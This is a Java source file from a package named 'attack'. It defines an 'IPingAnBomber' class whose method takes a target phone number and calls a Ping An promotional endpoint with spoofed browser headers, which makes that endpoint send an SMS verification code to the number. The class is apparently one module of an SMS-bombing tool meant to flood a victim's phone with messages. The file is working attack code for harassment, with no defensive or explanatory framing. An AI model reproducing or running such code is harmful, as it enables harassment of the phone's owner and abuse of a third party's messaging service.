package com.utils.attack;

import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.message.BasicHeader;
import org.apache.http.util.EntityUtils;

/**
 * Created by fz on 2015/8/23.
 */
public class IPingAnBomber implements MessageBomber{

    public String name;

    public IPingAnBomber(String name){
        this.name = name;
    }

    @Override
    public String emissionMissile(CloseableHttpClient httpClient, String fuckNo) throws Exception{

        HttpGet httpGet = new HttpGet("http://www.ilovepingan.com/qi/activities/getCode.action?act=yinlian1-1&phone="+fuckNo+"&d=1440319999002");
        httpGet.setHeader(new BasicHeader("Accept", "*/*"));
        httpGet.setHeader(new BasicHeader("Accept-Encoding", "gzip, deflate, sdch"));
        httpGet.setHeader(new BasicHeader("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2"));
        httpGet.setHeader(new BasicHeader("Connection", "keep-alive"));
        httpGet.setHeader(new BasicHeader("Content-Type", "application/x-www-form-urlencoded"));
        httpGet.setHeader(new BasicHeader("DNT", "1"));
        httpGet.setHeader(new BasicHeader("Host", "www.ilovepingan.com"));
        httpGet.setHeader(new BasicHeader("Referer", "http://www.ilovepingan.com/qi/activities/index.action?act=yinlian1-1&channel=yinlian"));
        httpGet.setHeader(new BasicHeader("X-Requested-With", "XMLHttpRequest"));

        CloseableHttpResponse httpResponse = httpClient.execute(httpGet);
        HttpEntity entity = httpResponse.getEntity();

        String result = null;
        if (entity != null){
            result = EntityUtils.toString(entity, "utf-8");
        }

        EntityUtils.consume(entity);
        httpResponse.close();
        return result;
    }

    @Override
    public String getBomberName() {
        return this.name;
    }
}
